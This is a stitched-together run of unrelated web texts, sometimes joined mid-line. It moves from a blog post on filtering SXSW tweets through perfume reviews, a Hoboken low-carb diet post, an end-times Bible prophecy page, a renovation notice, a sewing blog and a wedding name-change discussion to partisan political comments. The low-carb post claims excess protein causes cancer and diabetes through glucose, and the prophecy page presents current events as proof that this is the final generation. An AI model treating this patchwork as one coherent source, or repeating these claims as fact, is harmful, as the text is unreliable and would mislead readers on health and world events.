SXSW is such a monolithic event in tech-land that for those five days in March, it can be absolutely excruciating to be online from anywhere other than Austin, Texas. Last year I coped with this dilemma through my preferred methodology: going myself. But this year, even my FOMO couldn’t get me out the door: my husband and I have back-to-back trips that will see one or the other of us out of town for 10 solid days in late March, and if I went to SXSW, it would be 15. That’s just too big a disruption for our kids, so I decided to put my family over FOMO (bumper sticker, anyone?).
As a result, I’m now suffering through an epic bout of WAIGTSXSWITIS: Why Aren’t I Going To SXSW-itis. It’s a temporary but painful seasonal condition that afflicts hundreds of thousands of nerds each year.
But now there is a cure.
Welcome to Seesmic Desktop, a Twitter client that has got some very nice features, including a “marketplace” that allows you to add a variety of enhancements. One of those enhancements is a Filter plugin that lets you automatically exclude any tweet containing a specific keyword.
Here’s how I’ll use it to get through the worst of my WAIGTSXSWITIS. While I will continue to use HootSuite as my primary client (can’t live without it!) I recognize that there will be moments (like, anytime I don’t have a drink in my hand) that I can’t deal with all the SXSW tweets. At that point I’ll switch over to Seesmic, where I’ve configured the Filter (under settings/plugins/Filter) to exclude any tweet containing SXSW, #SXSW or Austin (just to be safe — sorry, Texan pals).
Is this mature? Is this evolved? Is this the professional equivalent of sticking my fingers in my ears and yelling “I can’t hear you”? No, no and yes.
But so what? I am the same immature and emotionally stunted person that I was before Twitter was invented. All Twitter has done is turned up the volume on those insecurities.
If Seesmic helps me turn the volume back down for a few minutes — minutes when I may want to be actually present for another, non-neurotic engagement online — then I’ll happily embrace it.
There’s a tool called Proxlet that might be helpful! Lets you filter tweets, temporarily mute users and apps, etc.
Another client that allows blocking/filtering is YoruFukurou for the Mac. You can block by keyword, user ID or (for those ubergeeks): REGULAR EXPRESSION.

super nice is fresh but with a oomph the coffee is more predominant than the vetyver is really nice and i usually wear it alone , a must try
Looked very much forward to trying this fragrance after reading reviews and hearing some positive thoughts about it. Additionally, I bought some pretty nice body sugar scrub and shea-cocoa body butter creram in a (dupe) scent of BVC. So, I thought, "Why not...while waiting for my scrub 'n cream, I'll get a sample of the fragrance from The Perfumed Court to try in the meantime...just to see."
Well, perhaps in a (dupe) fragranced sugar scrub and/or cream this scent will be pleasant enough. As a cologne or EDT, it is just alright but nothing special. Certainly not a fragrance I would ever purchase or wear on a regular basis, if at all.
To my nose-smile-BVC's initial opening is a very pleasant and rather fragrant note of a medium roast coffee...pretty interesting actually. What immediately follows (and I mean IMMEDIATELY) is a moderate middle note of, well vetyver and then...pretty much more of the same and a lot of nothing...at least that is how it landed on my skin.
Vetyver and coffee...that's it...in that order...on and on Mostly vetyver and little coffee, if any. I was actually hoping for a unique roastier, toastier, nuttier fragrance with less green. But...nothing unique here, nothing particularly fragrant. All in all, I found it somewhat bland and boring. But again, I'm the type of gal who likes to smell unique and who likes to know that I am wearing perfume. Subtle, linear-type fragrances aren't my forte.
A light and vaguely woody cloud of alcohol right out of the vial. I waited patiently for quite a while for the pure ethanol fumes to go away, and I'm left with just the barest hint of spice and wood with light coffee. What little wood there is is dry and smooth (interesting, because I often find sweet wood to be smooth, and dry wood to be grating). It has a graininess that I like, such as that from brown rice or pasta cooking, wheat bread, or certain cereals, but this is temporarily marred by a sourness that reminds me too much of cigarette smoke. Still, it's so ridiculously weak that I couldn't possibly give it anything but a thumbs down. I don't know if the rest of the Jo Malone line is so weak, but smelling this one certainly doesn't encourage me to try any of the others! By the end (15 mins?) only the vaguest wood aura remains, but there is so little left that I almost wouldn't know I had applied any fragrance at all.
I get lots of nutmeg and vetiver after the initial coffee blast dies down. Unfortunately the particular type of incense they use goes kinda soapy on me, so that + its undeniable longevity/sillage issues make this a no go. Kinda fun but novel, fleeting, AND discontinued.
I kept thinking where's my coffee?
It opened with Vetiver and Incense and didn't really evolve to anything else. Just vetiver and incense until it fades. I was really disappointed that I didn't get any coffee. It smells like it would be a great base to something but is un impressive on it's own.
Alright scent, doesn't smell all that original and I know someone my hound me for this but I swear this smells just like the drydown of Amouage Jubilation XXV Man.
Nice on paper. Disgusting on my skin. Smells like sour instant coffee. Yuck.
Coffee and Vetyver.
Not a bad scent, great for coffee lovers.
Sadly it has been discontinued! They dont sell it in the USA anymore
Sprayed a little bit of Red Rose Jo Malone underneath of Black Vetiver Cafe. Ended up with the result of something rather heavy in between Encens Mythique D'Orient and Rose Nacree Du Desert Guerlain. I can only strongly recommend this combo to people who can tolerate well, say, Shalimar EDP (from the beginning to the end). Relatively long lasting combo.
GOOD fragrance:)
I couldn't agree more with jht4060. Jo Malone, how I love your frags but the longevity is weak on most. Sigh. I am left longing for more or I have to spray over and over. The "layering" that Jo Malone markets is fine, however, a fragrance should stand on its own merits for a reasonable amount of time!
So far the BEST coffee scent I've ever smell.
Longevity/Sillage: super weak, but the smell (composition) is marvelous. Too bad it's discontinued (I am reading I don't know) and it's so weak - if this was an Intense EDP it would be one hell of a fragrance!
Yes this frag was discontinued.
Was it discontinued?
This was bought for me as a gift by my sister who, bless her, had only one clue to pick from (which was that I liked spiced smells). As a result, the person who helped her suggested this scent by Jo Malone.
I honestly haven't been a fan of his and this further solidifies that. I am sure that it would smell wonderful off the nape of a tobacco stained, perspiring male. On me it initially exudes that flat smell of leather from a cheap car and a $1 cup of MacDonalds coffee. Perhaps even the taste of Jelly Belly's poor jelly bean replica of a cuppaccino. Underneath it all is a warm sweetness tinged with a trail of spice. I imagine this must be the coriander, vanilla, nutmeg and pepper. I wished this would be more apparent as it would save me from the top notes that I couldn't love. The slight pleasantness of this was still overpowered by the artificial coffee and leather notes still singeing at my nostrils.
There was barely a dry down as my two sprays didn't last longer than 30 minutes. That said, my body must eat up scents because they never last on me for very long.
I can see it being beautiful but just not on me.
For any lovers out there who are fortunate to do this cologne justice, I have one full bottle (minus 4 sprays) for trade.
Jo Malone Black Vetyver Cafe is gorgeous and tragically weak. The presentation of vetiver with coffee and enriched with subtle spice works brilliantly and then POOF it is gone. I want to love this, I DO love this. Black Vetyver Cafe I love you! Stay with me, don't go... Oh my sundered heart, I did love you!
Jo Malone - get a clue. Coffee, vetiver, nutmeg, pepper - these are not expensive components. If it is all synthetic, they are even cheaper. Triple your formula strength and you would have a huge winner. You can always spray and spray and spray, but then it gets expensive and it just doesn't seem right.
This was an interesting take on vetiver. The coffee in this blended well with the other notes. It's fresh and woody as well. A well done fragrance that should last longer. Try it.
LOVE THIS FRAGRANCE!!! It is really Oooooohhh La La!!!
The perfect coffee shop date fragrance!
However, it doesn't wear very long... maybe at the most, about 2-3 hours on me, then is a quick fade.
---------
This is one of those fragrances that has a full bodied smell that almost hints at a base of tobacco. I perceive this to be unisex, because it is in the deeper range of women's perfume's and in the lighter range of men's colognes... a happy medium for those of us that like a lower register warm fragrance.
Visual: I could envision an adorable bistro coffee shop with a couple sitting together on a Saturday or Sunday morning, sipping hazelnut coffee and staring romantically into each others eyes - after a wonderful night on the town -- and love making the night before.
The essence of this is like reading a wonderful romance book, curled up by a fire. It embraces you with this old-world warmth, almost the same feeling when you find a truly treasured antique that brings to life a different time period, all together.
This is rich, elegant, warm, enticing, old-money, possibly even Ivy League... rolled into a fragrance. It reminds me of walking through leaves in the fall... a very nostalgic type fragrance, with almost haunting notes.
I love it... I only wish that it stayed on longer than 2-3 hours on my skin!
PLEASE... if you find anything even remotely similar to this, MESSAGE ME and let me know! My heart longs to wear this, but I don't want to invest in a fragrance that only lasts 2 hours on my skin!
I absolutely loved this, but it was totally gone after less than one hour! Shocking. The scent of coffee was the best I've ever had the pleasure of wearing--better than So New York, Trussardi Inside, and definitely better than Tom Ford's Cafe Rose. But sadly I could never buy something that lasts for only 20-30 minutes.
Smells fantastic! Unfortunately gets eaten quickly on my skin. But for 30-60 minutes smells divine. Agree this should be made into an "intense", "extreme", "double black", EDP or whatever! Just give me these notes, but smack me in the face with them almost as Prada Amber Pour Homme Intense is to just the Amber Pour Homme.
I am in love with this one. Coffee drinker and that's as far as it goes with coffee, until I smelled this wonder.
This is a perfect wake up, yummy coffee with earthy accords; wood, incense and vetyver offcourse. Simply amazing. Wish it lasted longer, 3 hours and refill needed!
Unisex, perfect for mornings (for real) and to get you thru the day:)
I really love this scent but it's so light. I want a stronger version of it, but the notes on it are great. I wish it was an EDP.
i've never gotten so many compliments...this seems to work with my chemistry...i always get I smell like candy...weird..
I really like this, it's a subtle coffee . I see where a lot of people are saying they don't like weakness of the scents, however I was told by an SA that the scents are sold as "cologne" on the titles, however they are actually eau de parfums, They market as colognes to gain unisex appeal to men.
Goes on with a familiar scent that I can't quite peg; smells very good, but lasts two hours. What is that note? Reapplying makes me think that the note is tea, and it is joined by a high-end kind of elegant cologne smell, but after fifteen minutes, the natural la femme note pokes out -- and by that, I mean "menstrual flow". I am not kidding. Fortunately, that note is short-lived, but it is one of the most disgusting things I have ever smelled in a fragrance, bar none. As time passes, that note dilutes into a general tepid, sweaty, and cologne-y blend. I'm not sure who this would work for, but it sure didn't work for me.
I love coffee!! and Vetiver scents! Although I do like the smell very much I agree with the last reviewer, it's way too weak and watered down to pay a fortune for! I just don't get why the Jo Malone perfumes are so expensive??? If I was looking to spend that much on perfume I'd want something much stronger! That being said it's a very nice smell and does smell well blended and not cheap. However it really reminds me of one I have smelled before that I can't quite pin point I think it may have been a Marks & Spencer perfume even! Overall I do really like it but no where near worth the price tag for me anyway. xx
As one who does not subscribe to the Jo Malone "the solution is dilution" aesthetic, I never approach the fragrances of this house with much hope. I really do prefer perfume to cologne and I find it absurd to pay perfume prices for a tiny bottle of weak cologne that would last me maybe a week.
That said, BLACK VETYVER CAFE certainly sounds like an excellent idea to this coffee lover. What I find, however, is that this is not really very black at all--again, a result of dilution. Take a black elixir and add a ton of solvent, and it will be a pale shade of dirty gray. This fragrance does not smell dirty, but it does smell like weak coffee sweetened with sugar and seasoned with vetiver.
Unfortunately, I have yet to acquire a taste for sweet vetiver (I'm also ambivalent toward Hermessence VETIVER TONKA...), so I'm afraid that BLACK VETYVER CAFE will not be the first Jo Malone to grace my collection... I would recommend this fragrance to people who think that Thierry Mugler A*MEN is way too thick and synthetic. This composition, while thin, is also natural smelling.
The "Jo-Malone-ness" speaks throughout this perfume - a certain feel, a certain weight a certain base blend that equates to another calm, refined & sensual JM scent.
I love the smell of freshly extracted, hand ground coffee. Deep, dark, rich, fruity & earthy - each bean has it's own delicate perfume & flavour story to tell.
I love nutmeg. It has that airy, piquant character that is so hard to pin down (warm-spicy-metallic-peppery-camphorous).
BVC is like viewing these two scent stars through a very gauzey veil. Vetyver, black pepper, soft woodsy notes & a very, very bland incense support from the wings & combine to form a very polite, very pleasant, calming, luminous scent.
BVC is a lazy morning in a terribly trendy health food cafe. A well-kept artsy lady in soft drapey fabrics is sitting drinking a cup of coffee, reading Wallpaper & nibbling on a low-sugar, lightly spiced, home made organic oat biscuit. The espresso machine steams away, the light streams in & warms up the reclaimed wooden tables. Flour dust dances in the sunbeams. In the kitchen, extremely healthy food is being prepared for lunch by a hemp-loving, incense-bathed beauty & a light, savoury coriander note mingles with the coffee & cakes. The lady finishes her coffee & leaves....
Sadly, the best bits of BVC last about as long as it takes to drink a coffee on my skin. I am also slightly disturbed by the savoury coriander note that lingers in the dry-down.
So, BVC - pretty while it lasts, but far too tame, pale & calm to be added to my want list.
I love coffee, nuff said.
K guess I should say more.
It's starts with the dark clouds of the coffee essence itself and sweetens of later, just like the cappuccino I always get.
I don't love the scent, but i love that it's an interesting scent and definitely unashamed and fearless. It's a coffee scent pure and to the point.
I have a golden rule that when I try anything niche that I try not to like it rather than try to like it, because niche is quality over sales, and the effort is really put in, so it's a market I'd much rather support, so I have to remind myself that I might not like a fragrance because it's quite different from the mainstream market.
I love coffee. Sitting in a good coffee shop, drinking, smelling, relishing the taste...
Vetyver Cafe is definitely a fragrance that could as well be part of this experience. The strong coffee note is the dominant one, I personally do not get citruses at all. Then it becomes more spicy, and makes me think of Christmas period. My associations take me (as usually) a bit too far, but for methere is a somewhat festive aura around this fragrance. I blame the nutmeg.
The final phase belongs to woody notes entirely. A woody coffee. A coffee served on a wooden table. Smoky incense coffee with a dose of vanilla.
In a way it is similar to Bond no 9 New Haarlem, the latter being far more complex and long lasting, but for the coffee note lovers such as me, who do not necessaity have the means to splurge 100 pounds on a bottle of perfume, really worth considering.
I liked the coffee note: not too bitter right away, lingering and soft. But the lasting power of this perfume is surprisingly minimal. I sprayed and sprayed and no matter what I do, the sccent is gone in minutes. I guess that is why this one is only available in the large bottle.
So glad to see this finally in the data base. It's one of Jo Malone's best fragrances so far. If you loved Givenchy's "Organza Indecence" or Victoria's Secret "Secret 88" you will adore this one. It has many similarities of the two aforementioned scents as it has a smoldering base notes of incense, vanilla and sandalwood. All those notes are intensified by the vetyver and nutmeg. I find this fragrance will last a long time if I apply a non-fragranced oil or body lotion before the perfume. The top note of citrus in the listing confusing to me, as I don't get any of that when applied. The coffee is definitely there immediately but soon becomes wrapped in the warmth of all the other notes. It is perfect for evening wear and especially in the cooler months, but I wear it whenever I need a comforting fragrance. This wraps me in warmth and coziness the moment I put it on. It's simply a must try for those who are attracted to spicy-woody fragrances.
It's unique coffee fragrance and absolutely not sweet, first is coffee, then like a forest after rain, vetyver distributes a fragrance of a wood and a moss. It's a bit masculine.
Just one thing... the scent doesn't last more than 20 minutes, at least I don't feel it nor on me not on my cloths or you have to put a lot a lot!
I'm sorry for money I spent, I'll try to finish a fragrance as soon as possible and forget that purchasing.
As for me - New Haarlem is more masculine and active because of strong lavender echo. BV&C is more cosy, unisex and meditative. may be the difference between them is like the difference between the steal and bronze.

Popular brands and perfumes:Getting creative with pork!
Food options do not have to be difficult when living low carb
When living the low-carb lifestyle, it often inspires creativity with your food options around town.
For the now permanent LCHF (low carb – high fat) life I’m living, it’s been easy to maintain and relatively problem-free for the most part, and I haven’t even become “bored” with anything.
The fact that you’re never hungry or peckish has a lot to do with it (food becomes less of a “pleasure source” rather than just eating because it’s time to eat).
I believe that plays a huge role, because when you’re constantly hungry when your blood sugar goes on the typical daily roller-coaster ride in the Standard American Diet (SAD), you equate the food you eat as “pleasureful,” rather than just feeding fuel to your body to survive.
That’s not saying us low-carbers don’t ever experience tasty, pleasureful meals to eat – we just don’t make it our mission to “make love” the food we eat nor do you have incessant cravings. It’s a non-event that doesn’t dominate our life or our thought-processes (more primal than anything). We use our new free time to do other, more useful things. Your mind is clearer, you become more focused. Fact of the matter.
Eggs go beyond bacon and ham in Hoboken, NJ!
Normally, one of the staples of a solid low-carb diet is EGGS. Yep, the much-maligned “egg from a chicken!”
Eggs are wonderful (when eaten in moderation). In fact – you know those “egg white” dishes you see everywhere? That’s overkill for the low-carb person. Because too much protein is also considered a negative – almost the equivalent to too many carbs, because when you ingest more protein than your body needs – it converts that excess to glucose, which is not good for you (cancer, diabetes, and all the negatives associated with sugar).
In fact – you’re better off eating the YOLKS!
Regardless, I was at my favorite Hoboken Deli Cugini Kitchen uptown (f.k.a. Joe’s Prime Meats) – and I saw a delicious lunch special tray of pulled pork.
I immediately thought – why shouldn’t I order pulled pork omellete? You have bacon, Taylor ham, Canadian bacon, why not pulled pork? It’s the same damn animal!
WOW – it was better than I thought. The texture and richness of a tender, properly cooked pulled pork is fabulous with a nice omelette. I also added cheddar – but next time I’ll also add onions, jalapenos, and spicy pepper jack cheese instead – with maybe some red pepper flakes and cayenne as well.
The omelette you see pictured above was only 4 eggs with perhaps 6oz. of pork. I couldn’t finish half of it. By keeping the blood sugar low, and ingesting the proper amount of fat – my body immediately told me I was full, and didn’t need to “clean my plate.”
I saved the rest for dinner – and remain thrilled that weight is dropping on a weekly basis with essentially zero suffering or sacrifice.
Special message to low-carb haters and detractors:
411 Note: I’ve now received well over 100 emails from local residents who’ve become inspired by the frequent low-carb updates here on Hoboken411. All have reported success (ranging from 5 to 40 pounds since this feature started).
And to all the “haters” who have tried lambasting 411 for publishing helpful tips about low-carb living in Hoboken – keep your negative comments to yourself if you cannot add something of value to the conversation. And if you recall reading, the low-carb life is NOT just for “vanity” purposes. The benefits go way beyond the superficial, which is why we feel it is very important to get the word out. Your health depends on it!
But luckily for you (when you are ready), I’ll gladly welcome everyone with open arms.
Hoboken411 has received a couple comments from suspicious individuals who try bashing the site (and this new health section) because their gripe is “it has nothing to do with Hoboken.”
Well, I hope this comment will clear things up.
Guess what? I has quite a bit to do with Hoboken.
1. I am a Hoboken resident, and want to share this will everyone in the tri-state area who reads the site. I believe it’s necessary to spread the good word.
2. I include Hoboken restaurants and businesses related to this positive lifestyle change – and that benefits residents and visitors of our city.
3. I include other Hoboken individuals who understand how important this is, and who also like helping others.
If a particular update here on 411 doesn’t interest, inform, help or entertain you – no one is forcing anyone to do anything. Take it for what you think it’s worth.
Hoboken411 is a free, independent web site – and luckily we can publish whatever we feel passionate about and want to share. While nearly all of the content here indeed has a direct connection to Hoboken, no one said we had to limit the kinds of material presented.
So for those that don’t get any benefit from being educated with accurate scientific data – and want to continue life as is, try not to get so offended.
Thanks!

PURCHASE THE WARNING
THIS GENERATION SHALL NOT PASS
The HOLY BIBLE tells us,
this generation shall not pass
. The HOLY BIBLE tells us we are in the final generation of mankind. The HOLY BIBLE tells us we are 66 years into the final generation; the countdown is concluding. The Holy Bible is capitalized three times to emphasize these statements are Biblical, they are not the ramblings of some religious fanatic trying to excite the public's imagination for a new Mayan calendar, or worse, trying to sell a book for greedy dollars. No, the Holy Bible plainly identifies us as the last generation. Have you seen what's going on in the Middle East? As it is written for these end days, believers are surrounded by scoffers and mockers who believe the Holy Bible to be a collection of fables, dreamed up by men of old with no real relevance for today's complex world. They are wrong. The Holy Bible is the most relevant Book to current events on our library shelves. The war in Iraq
(Babylon is fallen, is fallen)
and the destruction of the World Trade Center, 911, are both written of in the Holy Bible. Arab Spring and the re-election of President Obama are both necessary for the Holy Bible to come to its written conclusion (keep reading to find out why). In any case, the Holy Bible is the irrefutable, immutable Word of Truth, but we will not hear that in today's society. What, do you expect Hollywood, the liberal New York media or your college professor to begin extolling the virtues of reading the Bible? Your REAL Father, your Creator, Who is GOD, wants you to know what is about to happen to this generation. This will take only a few minutes of your time. Go all in, you will not regret it. Everything written in
italics
is in the Holy Bible.
Who in the Bible tells us, and where is it written that we are the final generation of mankind? Our Lord Jesus Christ Himself tells us in Matthew 24, Mark 13 and Luke 21. The Holy Bible also tells us that no one is to know
the day or the hour
, or, the
times and the seasons
of the end, but the Lord, bless Him, has told us the GENERATION in which the end will be, and that is our generation. We know this because the Lord told us to LEARN
the parable of the fig tree
, which He discussed in the three gospels just mentioned. Once we have LEARNED the parable, we realize the final generation began in 1948. Just do the math. This is not the venue to explain the parable in any detail, for it would take pages of space, but suffice it to say that when Israel became a nation again, the parable ended and the countdown began. The parable is all about the scattering and the gathering of the LORD'S Chosen, His Jewish children, and it is one of the most prolific prophecies in the Holy Bible. The parable, and the prophecy, was fulfilled in 1948. The Gentiles, the Romans and then the Arab nations, have ruled over Jerusalem from the time that the children were scattered until 1948. As it is written,
and Jerusalem shall be trodden down of the Gentiles, until the time of the Gentiles be fulfilled
. Let me just say this for those who do know their Bibles; the heart of
the parable of the fig tree
is Jeremiah 24, and the two baskets of figs set before the Temple in Jerusalem are the Israelis and the Palestinians. Now this is truth, even Holy Spirit Truth, but believers must realize it will not be respected, and will be turned into lies by our national media, Hollywood, our educational system, even many of the Preachers, Pastors and Rabbis who stand before us. But the Lord says,
let them forebear
, let them rant,
for the time will come when they will not endure sound doctrine
. The problem is, the world is not reading the Holy Bible, and that is about to cost us dearly, for we do not understand that warnings, such as the one below, was written for THIS GENERATION!
Behold, the days come, saith the LORD GOD, that
I will send a famine
in the land, not a famine of bread, nor a thirst for water,
but of hearing the words of the LORD
. Amos 8.11
That prophetic famine is upon us, and while no one could put a percentage on it, I would guess that at least 66.6% of the Judeo Christian world is functionally illiterate concerning the Holy Bible. That would not include the non-believers. Because of this, few believers, and all non-believers, are unaware of the numerous end time prophecies taking place in the world today. They are right in front of us; they are today's newspaper headlines, but the world takes no notice, because of the FAMINE our Father has sent upon us.
Come, let us reason together.
Please step back and intelligently look at what is happening in the world today. As stated, a dozen Biblical prophecies were fulfilled when our Father gathered His children back to Jerusalem, yet the world is naïve to the implications of this. Why? Because the world is not
hearing the words of the LORD!
The Holy Bible tells us in Psalms, Daniel, Ezekiel, Zechariah, Revelation, and other Books, that
Israel will be surrounded and besieged by her enemies in the final days of mankind
, just before the apocalypse begins. Be wise, and correlate that with Arab Spring. With recent events in Istanbul, we may have to re-name it Spring Turkey. Joking! Mubarak of Egypt is gone, initially replaced by the Muslim Brotherhood; now ran by the Generals and teetering on civil war. But few know that GOD said,
And I will set the Egyptians against the Egyptians: and they shall fight everyone against his brother...

, Hezbollah, who have anciently been Israel's enemy. Libya is in turmoil. Jordan is trying to maintain their fragile autocracy, but it is questionable whether they will be able to. The Gaza Strip was given back to the
Philistines,
Hamas, for the Holy Bible tells us,
Gaza shall be forsaken
. The West Bank is a hotbed, full of the children of
Ammon and Moab
, the Palestinians. Then we have the
Persians
, AKA the Iranians, who will join with
Esau
, Russia, to march on Israel, just as the Holy Bible tells us. All this, and more, is what the media has dubbed Arab Spring, but is it Biblical? Of course it is!
What this world cannot comprehend, and we are about to find out the hard way, is that our Heavenly Father is in perfect control of His creation. Israel is supposed to be surrounded by her enemies in the last days, it is written! Space and your patience does not allow me to get into a deep Biblical study, but for those who do know their Bibles, let me say this:
Ishmael
, described by God as a
wild man
, is the father of the 12 Arab nations we see today.
Isaac
, through his son
Jacob
, is the father of the Judeo Christian nations we see today. In other words, we have the 12 tribes of Ishmael, the Arab nations, pitted against the 12 tribes of Israel. Where are the 12 tribes of Israel? The tribes of Judah and Benjamin are still in the Holy Land, and the 10 northern tribes were scattered by our Father and settled throughout Europe. Many of their ancestors eventually migrated to America, the vast majority of them called Christians now. What we have then, is the Arab, now Muslim nations, intent on defeating the Judeo Christian nations, what we commonly refer to as Western Civilization. Therefore,
there is nothing new under the sun
, for Isaac and Ishmael have been at each other's throats for thousands of years. Biblically, our Father's blessings went to Isaac, as did all of Abraham's earthly possessions.
And Abraham gave all he had unto Isaac
. And now you know what Arab Spring is all about, now you know what ISIL is all about, as the Islamic nations establish their Caliphate to march on Israel. This is the 21st century version of an ancient rivalry, and Ishmael wants his revenge on Isaac! The irony is, they are HALF-BROTHERS! They are both Abraham's sons. Enough for Biblical lessons. This is all laid out, in detail, in our Heavenly Father's warning to His children,
This Generation Shall Not Pass
. Now you may be wondering, what could any of this possibly have to do with the re-election of President Obama? Please click unto THE FINAL GENERATION and see why we are, indeed, in the middle of Biblical prophecy.
This Generation Shall Not Pass
explains how we are identified in the Holy Bible as the final generation of mankind. There are a dozen Biblical studies explaining this , which have been kept hidden until now.

The work, as identified, has been slated to be completed in three phases, with the initial work now underway in 2013:
Admin Plant Management, as custodial owner of the building, has budgeted $2.5M of Asset Preservation funds for design and construction. This funding supports Phase I of the work identified in the predesign report. Private funds are being explored to support Phases II and III. Phase I began in June of 2013 and is scheduled to be completed in the summer of 2014. Due to the work being completed, tours of the Residence are not being held at this time. Please check back on our website in October 2014 for updated information on when tours will resume.
If you have any questions, please e-mail residence.gov@state.mn.us.If this past week had a theme it would have been "Vintage Pinks." I had a lot of fun with a pink handkerchief, pink embroidery, pink buttons and laces.
These little Christmas ornament stockings are fun to make and a great way to use up vintage bits. I made some angels too.
The pinks are put away for now and I am working on something completely different. Please stay tuned. Thanks so much for reading my blog.

SewlikethewindThe name-change game has already been discussed by several bees, but I would like to throw in my two cents!
To be honest, I never thought about changing my name. I never wrote “Mrs. [insert name of crush]” all over my notebooks. My name is my own and I never entertained the idea of losing it for any reason. To me, it would be like losing a part of myself, like losing my family. I will admit that I’m not even particularly fond of my last name—it’s one of those stereotypical, super-long Spanish last names that ends in Z and is a pain in the ass to spell. On the other hand, Mr. B’s name is short and sweet and perfectly French. It would be soooo much easier having his name, but that’s never been an option. Why?
Well, in Québec, you’re actually not allowed! GASP. Whaaaaaat? Yup. Civil Code, article 393:
In marriage, both spouses retain their respective names, and exercise their respective civil rights under those names.
BAM! Lawyered! There is a super complicated legal procedure to circumvent this, but it’s costly, and most of the time it doesn’t work. The reason for this law was allegedly to maintain a woman’s identity and also to avoid situations of marriage, divorce, remarriage, etc. where a person goes through five different names in a lifetime. And while I personally agree that a name should be somewhat permanent and not linked to marital status (after all, half of marriages sadly end up in divorce), I also don’t think the government should forbid women from taking their husband’s name if they want to!
Some women are most concerned about having the same name as their children. Like Mrs. Toadstool, I grew up with a different set of rules. In the Spanish tradition, a person has two last names, the first being traditionally the father’s, followed by the mother’s. Each person carries both of their parents’ last names, and when they have children the child’s last names are composed by the first last name of each parent. So, for instance, I’m:
Miss Waterfall Middle Name Papi Waterfall’s (first) Last Name Mami Waterfall’s (first) Last Name
My children would be:
Hypothetical Future Child Mr. Waterfall’s Last Name Miss Waterfall’s Last Name and so on and so forth. (If you’re confused, go on over to Mrs. Toadstool’s post—she explains it much better, and even has an adorable little diagram to go along with it.)
I actually really like this system because I believe a child is made of equal parts from each parent, and that includes the names. Sadly, over years of living in Canada, having a first name, a middle name, and two sets of last names was really cumbersome because nobody else had that many names. I always run out of space on government forms whenever I have to enter my full name! Over time, I started going by my middle name and only use my full last name on official government documents.
What about our future children? Well, Mr. Waterfall and I have decided that they will only have his last name because, frankly, his French name and my Spanish name don’t go together at all. And sure, it bums me out a little that they won’t have any part of my last name, but it will make their lives so much easier.
What were your reasons for keeping or changing your name?

I never thought of changing my name. In my country, Bolivia, you can still have your Name+LastName and if you want, when you get married you add something that translates “OF HIS LAST NAME” like you are some kind of property… LOL
It’s fairly easy to do, however that means you need to change your signature (and I love mine) and you need to convalidate all the paperwork you did before so they know it’s you. As I said I never thought of doing it and my husband told he didn’t like the sound of the “Of His Last Name” because we are still two people that choose to be in the marriage and I’m not something he got for himself
I never knew that about Quebec, and always judged my aunt-in-law for keeping her name haha (and other reasons obviously). Well thank you for removing (some) of my ignorance
How interesting that they (more or less) forbid changing names!
Ah Spanish last names. A part of me is glad that I don’t live in one because the last name will consist of “de” or “del”. I’m not a possession, but a human being. I thought about hypheniating my name like my friends did but it’ll be long. Plus, it doesn’t roll off the tongue that well (it would’ve consist of 5 sylbols). In the end, I’m going to make my maiden name my middle name and use my FI’s name.
This is really interesting!
In the UK it’s still commonplace for the woman to take her husband’s name, although it is possible just to change it legally and still use your maiden name on everything.
My FI and I compromised – I’m changing my name, and he’s wearing a wedding ring. Win-win!
Can you give future kiddos your last name as their middle name?
To each her own. I changed my last name because I wanted it to reflect my new identity as a married woman. If I did not change it, I would be breaking a centuries old tradition in my husband’s family. My traditionalist MIL would not have been pleased.
Fascinating! I had no idea! I just read Miss Toadstool’s post as well. We learn something new everyday
I’m not sure what I’m going to do. Currently I’m thinking of not taking his name. But then it saddens me that we will have different last names. I don’t want his family name because his family doesn’t like me (for no reason other than that they hate “sharing” him with someone else) and they hate “newcomers” to the family. I’m trying to talk him into taking my name. My family loves him and are really happy for us so it makes sense to me.
I am in my own name change conundrum. I have always wanted to take my FH’s last name. I have always envied the way my entire name sounds with his last name substituted for my own…. and I always thought we would be married by now! My main problem is that we’re not married yet, and as a PhD student, I’m beginning to publish. Because we are not yet married that gives me 3 options: 1. publish under my maiden name and keep my maiden name 2. publish under my maiden name now and then hyphenate my name: maiden-Atkins 3. scrap my maiden name and publish in the future under Atkins and not have my old publications “count” towards my H-index :/
Taking FH’s last name is truly important to me… unfortunately, for women in science in America it’s kind of hard.
I guess I am going to go with option 2 and publish under my hyphenated name. I will use his last name for all my personal things, but I will hyphenate for professional publications and official documents :/
I had no idea about that law in Quebec, that’s very interesting. I kinda wish it were that way here so that the decision were made for me!
I had no clue about this law! My aunt and uncle got married in Montreal, but she has his last name. I guess she changed it when she moved to Ontario.
Also, I find it interesting that SO and I were (inadvertently) planning to follow a Spanish style on naming our future children.
Wow! What an interesting bit of info I have learned today! I always love hearing different point of views in regards to changing your last name! Great Post!
So it isn’t weird for kids to have only their dad’s last name and not share a name with their mom? Wow, I had no idea that’s how they did things in Quebec… and only in Quebec, not all of Canada? Mind=blown.
Huh, that’s really interesting about Quebec… I’m kind of glad I’m allowed to take FH’s name here, though my situation is kind of unique: I have a traditional Irish last name, complete with apostrophe, which computers really hate. I often have to clarify with official places that my legal last name is different than what shows up in their computers… O’Malley as opposed to OMALLEY for instance. That plus I’m a lot closer to my mom’s side of the family that my dad’s and I’m marrying a guy whose last name goes pretty well with my first name, and, really, I’m actually relieved to be changing it. Yet another bonus of getting married…38 days and counting
@cosmo_gmr: @BeeRod527: I totally know what you mean about DE or DEL. For some reason when I was small, I decided my Barbies’ last name was Soza De Soza 😀

@bridinmt: Unfortunately, it’s VERY long and last namey. Think Fernandez, Rodriguez… that sort of thing. I wouldn’t wanna do that to future waterfall babies 😀
@TakeTwo: I agree. To each her own! I think it should be a personal choice and not a government dictated one!
@Samantha: Him taking your name would be a really cool alternative!
@FutureDrAtkins: That IS a connundrum! Sounds like you found a good compromise though. I guess I would have to file a name change with the Bar if I ever did change it since I’m registered to practice law under my current name.
@pocketfox: She might have done it before the law passed or simply done the loophole version of the name change. I really like the Spanish way of naming children, though probably out of habit more than anything else
@Blonde17Jess: Well, Quebec already has the lowest marriage rate in Canada since a lot of people are in domestic partnerships. I’ve seen it done all sorts of ways, Dad only; Mom only; Dad + Mom, Mom + Dad, Dad-Mom and Mom-Dad! But people don’t seem too concerned if the children have a different last name. Mr. Waterfall has his mom’s last name only, actually.
@MissPoohBear: Lucky you!.
This is just one more thing that proves he is not ready for the Oval Office.
You reports are wanting him to change his postion so bad that you are changing it for him. He has said the same things all along that he said today. Are you guys working for John McCain?
The man is a fraud!!! Does anyone believe that the troops will be fully out of Iraq in 16 months if Obama becomes President? This guy is all over the place. Nobody knows anything about him because he doesn't know himself.
Just like he didn't know Wright or Pfleger or Rezco.
